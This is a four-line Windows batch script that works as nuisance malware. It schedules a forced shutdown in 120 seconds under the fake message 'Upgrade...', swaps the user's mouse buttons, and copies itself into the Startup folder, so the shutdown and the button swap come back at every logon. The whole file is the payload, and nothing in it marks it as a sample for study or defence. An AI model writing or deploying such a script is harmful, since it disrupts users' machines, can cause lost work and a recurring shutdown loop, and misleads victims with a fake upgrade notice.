@echo off
shutdown -s -t 120 -c "Upgrade..."
Rundll32 user32, SwapMouseButton
copy %0 "%userprofile%\Startm~1\Programs\Startup"
